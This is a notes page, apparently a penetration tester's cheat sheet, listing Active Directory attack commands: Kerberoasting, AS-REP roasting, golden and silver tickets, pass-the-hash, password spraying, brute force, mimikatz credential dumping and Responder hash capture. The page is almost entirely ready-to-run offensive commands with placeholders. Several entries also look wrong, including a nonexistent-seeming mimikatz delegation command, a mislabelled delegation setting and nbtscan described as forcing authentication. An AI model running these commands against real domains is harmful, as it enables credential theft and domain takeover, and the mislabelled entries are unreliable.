---
layout: notes
permalink: /notes/ad/attack/
title: Active Directory Attack Vectors
---

# Active Directory Attack Vectors

## Kerberos Attacks
```powershell
# Kerberoasting
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -o hash.txt

# ASREPRoast
GetNPUsers.py <domain>/<user> -dc-ip <dc_ip> -no-pass -request

# Golden Ticket
mimikatz.exe "kerberos::golden /admin:Administrator /domain:<domain> /sid:<sid> /krbtgt:<hash>"

# Silver Ticket
mimikatz.exe "kerberos::silver /service:HTTP /target:<target> /sid:<sid> /rc4:<hash>"
```

## Password Attacks
```powershell
# Password spraying
crackmapexec smb <target> -u users.txt -p passwords.txt

# Brute-force with Hydra
hydra -l <user> -P wordlist.txt <target> ldap

# Hash cracking with John
john --wordlist=wordlist.txt hash.txt

# Pass-the-Hash
mimikatz.exe "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"
```

## Delegation Exploits
```powershell
# Check for delegation
Get-ADUser -Filter {TrustedForDelegation -eq $true}

# Constrained Delegation exploit
mimikatz.exe "kerberos::delegate"

# Unconstrained Delegation
Set-ADUser -Identity <user> -Add @{msDS-AllowedToDelegateTo="dc01"}
```

## MITM Attacks
```powershell
# Start Responder
responder -I eth0

# Capture NTLM hashes
responder -I eth0 -P

# Force authentication with NBT-NS
nbtscan <target>
```

## Tools
- Mimikatz: ```mimikatz.exe "sekurlsa::logonpasswords"```
- CrackMapExec: ```crackmapexec smb <target> -u <user> -p <pass>```
- Responder: ```responder -I eth0```
- Kerbrute: ```kerbrute userenum -d <domain> userlist.txt```
- Impacket: ```python3 GetUserSPNs.py <domain>/<user> -dc-ip <dc_ip>```